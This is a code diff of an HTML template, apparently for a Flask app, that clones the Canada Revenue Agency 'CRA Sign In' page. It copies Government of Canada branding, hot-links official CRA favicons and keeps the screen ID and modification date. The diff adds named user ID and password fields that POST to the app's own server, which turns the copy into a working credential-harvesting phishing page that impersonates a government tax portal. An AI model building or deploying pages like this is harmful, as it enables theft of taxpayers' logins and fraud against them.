@@ -4,118 +4,76 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Canada Revenue Agency - CRA Sign In</title>
-    <link rel="apple-touch-icon" sizes="57x57 72x72 114x114 144x144 150x150" class="wb-favicon" href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon-mobile.png"><link href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon.ico" rel="icon" type="image/x-icon" class="wb-init wb-favicon-inited">
+    <link rel="apple-touch-icon" sizes="57x57 72x72 114x114 144x144 150x150" class="wb-favicon" href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon-mobile.png">
+    <link href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon.ico" rel="icon" type="image/x-icon" class="wb-init wb-favicon-inited">
     <link rel="stylesheet" href="../static/css/theme.min.css"> <!-- Link to your CSS file -->
     <link rel="stylesheet" href="../static/css/common.css"> <!-- Additional CSS -->
 
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/theme.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/common.css') }}">
+
 </head>
 <body>
-	<header>
+    <header>
         <div class="container">
             <section class="visible-md visible-lg text-right">
             </section>
             <div class="row">
-                
                 <div class="brand col-xs-9 col-sm-5 col-md-4">
-	                
-	                <img alt="" src="../static/images/sig-blk-en.svg" property="logo">
-	                <span class="wb-inv" property="name"> Government of Canada / <span lang="fr">Gouvernement du Canada</span></span>
-	                <meta property="name" content="Government of Canada">
-	                <meta property="areaServed" typeof="Country" content="Canada">
-	                <link property="logo" href="../static/images/wmms-blk.svg">
-            	</div>
-                
-                
+                    <img alt="" src="../static/images/sig-blk-en.svg" property="logo">
+                    <span class="wb-inv" property="name"> Government of Canada / <span lang="fr">Gouvernement du Canada</span></span>
+                    <meta property="name" content="Government of Canada">
+                    <meta property="areaServed" typeof="Country" content="Canada">
+                    <link property="logo" href="../static/images/wmms-blk.svg">
+                </div>
             </div>
         </div>
 
-		<div id="brand-container-cra">
-			<div class="container">
-				<div class="row">
-					<div class="col-xs-12 col-sm-10" id="brand-text-cra">
-						Canada Revenue Agency
-					</div>
-					
-					<div class="col-xs-4 col-sm-2 text-right">
-						
-					</div>
-				</div>
-			</div>
-		</div>
-		
+        <div id="brand-container-cra">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-10" id="brand-text-cra">
+                        Canada Revenue Agency
+                    </div>
+                    <div class="col-xs-4 col-sm-2 text-right">
+                    </div>
+                </div>
+            </div>
+        </div>
     </header>
 
     <main class="container">
-        <h1>CRA Sign In</h1>
-            <div>
-                <form class="form-signin" method="POST">
+        <div>
+            <h1>CRA Sign In</h1>
             
+            <form class="form-signin" method="POST"> <!-- Specify action URL -->
                 <label class="required">User  ID <strong class="required"><i>(required)</i></strong></label>
-                <input type="text" class="form-control" required autofocus>
+                <input type="text" name="user_id" class="form-control" required autofocus>
                 <p><a href="">Forgot your user ID?</a></p>
             
                 <label class="required">Password <strong class="required"><i>(required)</i></strong></label>
-                <input type="password" class="form-control" required autofocus>
+                <input type="password" name="password" class="form-control" required> <!-- Changed type to password -->
                 <p><a href="">Forgot your password?</a></p>
 
                 <button type="submit" class="btn btn-primary">Sign In</button>
-                <button type="submit" class="btn btn-default">Exit</button>   
-            </div>
+                <button type="button" class="btn btn-default" onclick="window.location.href='/'">Exit</button> <!-- Exit button behavior -->
+            </form>
+        </div>
 
-            <p>
-                For more information on how your privacy is protected, refer to our <a href="">Personal Information Collection Statement</a>. 
-            </p>
+        <p>
+            For more information on how your privacy is protected, refer to our <a href="">Personal Information Collection Statement</a>. 
+        </p>
 
-            <div class="form-actions">
+        <div class="form-actions">
+        </div>
 
-            </div>
-        </form>
         <p>To <a href="">register</a> if you are a new user.</p>
         <p>To <a href="">revoke or change your CRA user ID or password, or to manage your security questions and answers</a>, you must first sign in.</p>
 
         <div id="pageLabel">Screen ID: CMS.30</div>
-        
-	
 
-
-
-
-	
-	<div>
-	    <dl id="wb-dtmd" property="dateModified">
-	        <dt>Date modified: </dt>
-	        <dd><time>2024-10-21</time></dd>
-	    </dl>
-	</div>
-
-    </main>
-
-    <footer id="wb-info" class=" wb-navcurr-inited">
-	
-	
-	
-	
-        <div class="brand" style="border-top:4px solid #335175">
-            <div class="container">
-                <div class="row ">
-                    <nav class="col-md-10 ftr-urlt-lnk">
-                        <h2 class="wb-inv">About this site</h2>
-                        <ul>
-                            
-                            
-                            
-                            <li><a href="">Terms and conditions</a></li>
-                            
-                            <li><a href="">Privacy</a></li>
-                        </ul>
-                    </nav>
-                  <div class="col-xs-6 col-md-3 col-lg-2 text-right">
-                    <img src="../static/images/wmms-blk.svg">
-                </div>
-                </div>
-            </div>
-        </div>
-    </footer>
-
-</body>
-</html>
+        <div>
+            <dl id="wb-dtmd" property="dateModified">
+                <dt>Date modified: </dt>
+                <dd><time>2024-10-21</time></dd>
+            </dl>
